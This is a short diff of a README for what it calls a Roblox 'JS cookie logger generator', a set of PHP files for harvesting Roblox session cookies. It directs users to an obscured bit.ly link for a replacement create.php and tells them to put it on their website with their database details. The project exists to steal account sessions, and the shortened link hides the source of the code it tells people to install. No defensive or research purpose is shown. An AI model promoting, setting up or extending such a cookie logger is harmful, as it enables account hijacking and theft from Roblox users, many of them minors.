@@ -8,8 +8,12 @@ A bunch of phps and some stuff for a Rblx Js cookie logger generator
 
 # Errors with create.php
 IF YOU HAVE ERRORS I HAVE UPDATED CREATE.PHP HERE
+
 https://bit.ly/UPDATEDCreatedotphp
+
 REPLACE IT IN YOUR WEBSITE! IT SHOULD WORK  - 29/01/22
+Replace with your database info, username, password, etc
+
 
 # Preview
 1. Design
